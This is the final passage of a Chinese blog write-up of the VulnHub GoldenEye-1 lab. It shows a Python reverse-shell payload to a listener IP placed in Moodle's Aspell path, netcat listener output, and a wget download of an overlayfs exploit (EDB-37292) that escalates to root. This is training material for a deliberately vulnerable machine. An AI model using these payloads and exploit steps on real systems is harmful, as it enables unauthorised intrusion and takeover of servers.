+<p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub142.jpg"></p>
+<p>正确设置路径后，即可创建任何博客文章或页面。在编辑器上，可以调用spellcheck函数以获得reverse shell连接。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub143.jpg"></p>
+<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub144.jpg"></p>
+<p>点击上图的按钮之后kali端返回了shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 48087</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>我首先列举了box的操作系统版本。那是一个Ubuntu 14.04.1 box。在Google的搜索中，我发现该机器容易受到overlayfs<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">EDB-37292<i class="fa fa-external-link-alt"></i></span>攻击。我在kali上编译了它，然后将其转移到目标box中。运行漏洞利用程序时出现错误-sh：1：gcc：找不到。</p>
+<p>目标框上没有gcc。如果我们检查exploit-db 37292漏洞利用代码，则在第143行上，您可以看到漏洞利用正在调用gcc。好吧，这很棘手。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub145.jpg"></p>
+<p>我使用linuxprivchecker.py枚举了该框，以枚举已安装的开发工具。box里没有gcc，但是有cc。cc是原始UNIX c编译器命令的名称。对于cc和gcc的确切区别，我不是专家。我尝试在漏洞利用源代码中将gcc更改为cc并进行编译。生成的二进制文件为我root了box。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub146.jpg"></p>
+<p>在kali中编译好exp后，直接wget下载到攻击机的shell中即可，然后赋予777权限，.&#x2F;exp执行，成功提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/exp</span><br><span class="line">wget http://192.168.56.102:8000/exp</span><br><span class="line">--2020-01-10 06:24:47--  http://192.168.56.102:8000/exp</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17616 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 17,616      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-10 06:24:47 (331 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17616/17616]</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">changelog.txt  config.php  editor_plugin.js      exp  includes</span><br><span class="line">classes        css         editor_plugin_src.js  img  rpc.php</span><br><span class="line">$ <span class="built_in">chmod</span> 777 *</span><br><span class="line"><span class="built_in">chmod</span> 777 *</span><br><span class="line">$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>找到flag，帅爆了。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 44</span><br><span class="line">drwx------  3 root root 4096 Apr 29  2018 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Apr 24  2018 ..</span><br><span class="line">-rw-r--r--  1 root root   19 May  3  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Apr 28  2018 .cache</span><br><span class="line">-rw-------  1 root root  144 Apr 29  2018 .flag.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 19  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Apr 23  2018 .rnd</span><br><span class="line">-rw-------  1 root root 8296 Apr 29  2018 .viminfo</span><br><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> .flag.txt</span><br><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub147.jpg"></p>
+<p>最后的flag是这个</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub148.jpg"></p>
+<p>一张动图,蛮有意思的。</p>
+<ul>
+<li>知识点总结：</li>
+</ul>
+<p>1.telnet邮件泄露<br>2.图片隐写<br>3.moodle管理员账户远程代码执行<br>4.Ubuntu 14.04.1版本提权<br>5.exp overlayfs[EDB-37292] 编译cc执行</p>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/08/GoldenEye-1/" title="vulnhub靶机渗透[GoldenEye-1]">https://fdlucifer.github.io/2020/01/08/GoldenEye-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/03/W1R3S-1-0-1/" rel="prev" title="vulnhub靶机渗透[W1R3S-1-0-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[W1R3S-1-0-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/01/10/In-Plain-Sight-1-0-1/" rel="next" title="vulnhub靶机渗透[In-Plain-Sight-1-0-1]">
+                  vulnhub靶机渗透[In-Plain-Sight-1-0-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
